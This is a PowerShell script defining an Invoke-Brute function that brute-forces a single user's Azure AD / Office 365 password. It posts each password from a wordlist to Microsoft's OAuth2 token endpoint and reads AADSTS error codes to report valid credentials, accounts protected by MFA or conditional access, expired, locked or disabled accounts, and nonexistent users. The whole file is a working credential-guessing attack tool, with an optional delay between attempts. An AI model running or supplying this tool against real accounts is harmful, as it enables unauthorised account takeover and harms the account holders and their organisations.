function Invoke-Brute{
	<#	
	.DESCRIPTION

	This tool is to perform brute force on a specifid user over Azure

	.EXAMPLE

	Invoke-Brute -User "first.last@email.com" -PasswordList .\Passwords.txt 
	Description
	------------
	This command will use attempt to authenticate as the user provided iterating over the passwords in the password list

	#>

	Param(

	[Parameter(Position = 0, Mandatory = $False)]
    [string]
    $User = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $PassList = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [int]
    $Delay

	)

	$ErrorActionPreference= 'silentlycontinue'
    $Passwords = Get-Content $PassList
    #$Passwords = @("P@ssw0rd1!", "MySecurePwd2#", "RandomPass3$")
    $URL = "https://login.microsoft.com"
    $found = 0

    Write-Host -ForegroundColor "yellow" ("[*] starting the brute force")

    ForEach ($password in $Passwords){
        Write-Host -nonewline "Testing $password `r"
<# #>
        $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $User ; 'password' = $password ; 'scope' = 'openid'}
        $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 

        If ($webrequest.StatusCode -eq "200"){
            Write-Host -ForegroundColor "green" "[*]Success! $User : $password"
            $found = 1
                break
            }
        else { If($RespErr -match "AADSTS50126")
                {
                continue
                }

            ElseIf (($RespErr -match "AADSTS50128") -or ($RespErr -match "AADSTS50059"))
                {
                Write-Output "[*] WARNING! Tenant for account $User doesn't exist. Check the domain to make sure they are using Azure/O365 services."
                }

            ElseIf($RespErr -match "AADSTS50034")
                {
                Write-Output "[*] WARNING! The user $User doesn't exist."
                }

            ElseIf(($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076"))
                {
                Write-Host -ForegroundColor "green" "[*] SUCCESS! $User : $password - NOTE: The response indicates MFA (Microsoft) is in use."
                $fullresults += "$User : $password"
                $found = 1
                break
                }
    
            ElseIf($RespErr -match "AADSTS50158")
                {
                Write-Host -ForegroundColor "green" "[*] SUCCESS! $User : $password - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                $fullresults += "$User : $password"
                $found = 1
                break
                }

            ElseIf($RespErr -match "AADSTS50053")
                {
                Write-Output "[*] WARNING! The account $User appears to be locked."
                }

            ElseIf($RespErr -match "AADSTS50057")
                {
                Write-Output "[*] WARNING! The account $User appears to be disabled."
                }
            
            ElseIf($RespErr -match "AADSTS50055")
                {
                Write-Host -ForegroundColor "green" "[*] SUCCESS! $User : $password - NOTE: The user's password is expired."
                $fullresults += "$User : $password"
                }

            Else
                {
                Write-Output "[*] Unknown error for user $User"
                $RespErr
                }
        }

        if ($Delay -gt 0) {
            Start-Sleep -Seconds $Delay
        }

    }

    If ($found -eq "0"){
        Write-Host -ForegroundColor "red" "[-] No valid creds found!"
    }

}